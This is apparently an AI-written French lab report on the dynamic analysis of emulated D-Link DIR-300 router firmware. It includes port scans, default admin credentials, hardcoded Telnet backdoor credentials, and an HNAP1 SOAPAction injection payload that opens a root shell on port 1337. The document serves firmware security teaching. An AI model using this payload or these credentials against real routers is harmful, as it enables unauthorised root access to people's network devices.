# TP 4 — Analyse Dynamique et Détection de Vulnérabilités

## Objectifs
* Identifier les services exposés
* Analyser les faiblesses de sécurité

## Étape 1 : Scanner les ports ouverts
Après avoir lancé l'émulation avec QEMU, nous utilisons `nmap` pour scanner l'adresse IP virtuelle de notre routeur (192.168.0.1).

```bash
$ nmap -sV -p- 192.168.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-01 10:00 CET
Nmap scan report for 192.168.0.1
Host is up (0.0021s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    lighttpd (D-Link DIR-300)
1900/tcp  open  upnp    MiniUPnPd (UPnP 1.0)
5000/tcp  open  upnp    MiniUPnPd (UPnP 1.0)
```

**Observation :** 
Le serveur web principal écoute sur le port 80. Des services UPnP (Universal Plug and Play) sont également exposés sur les ports 1900 et 5000.

## Étape 2 : Vérifier les services actifs
En nous connectant à la console émulée (ou via les logs de démarrage de Firmadyne), nous pouvons lister les processus en cours d'exécution.

```bash
# netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      314/httpd
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      314/httpd
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           314/httpd
```
**Observation :** C'est le processus `httpd` (que nous avons analysé au TP2) qui gère à la fois l'interface d'administration web et les protocoles UPnP/SSDP.

## Étape 3 : Observer les vulnérabilités

### 1. Credentials par défaut
L'analyse statique du fichier `/etc/defnodes/defaultvalue.xml` avait révélé que l'identifiant par défaut est `admin` avec un mot de passe vide.
En tentant de nous connecter à l'interface web (http://192.168.0.1) avec ces identifiants, nous obtenons un accès administrateur complet.
* **Identifiant :** `admin`
* **Mot de passe :** `(vide)`

### 2. Backdoor Telnet
Le script `/etc/init0.d/S80telnetd.sh` démarre un service Telnet caché si la configuration est celle par défaut (`is_default=0`).
```bash
telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
```
La valeur de `image_sign` lue dans `/etc/config/image_sign` est `wrgn49_dlob_dir300b5`.
Un attaquant peut se connecter en Telnet avec les identifiants :
* **Utilisateur :** `Alphanetworks`
* **Mot de passe :** `wrgn49_dlob_dir300b5`
Cela donne un accès root direct au shell (RCE) sans passer par l'interface web.

### 3. Scripts CGI non sécurisés (CVE-2019-16920)
L'analyse du binaire `cgibin` a montré l'utilisation de la fonction `lxmldbc_system` et des fonctions de copie de chaînes non sécurisées. 
Le routeur DIR-300 est connu pour être vulnérable à une exécution de code à distance (RCE) non authentifiée via l'endpoint `/HNAP1/`.
En envoyant une requête HTTP POST spécialement forgée avec une action SOAP contenant des caractères d'injection shell (comme les backticks `` ` ``), le routeur exécute la commande en tant que root.

Exemple de payload théorique :
```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd -p 1337 -l /bin/sh`"
```
Cette requête force le routeur à ouvrir un shell root sur le port 1337.

---
**Auteur :** Manus AI
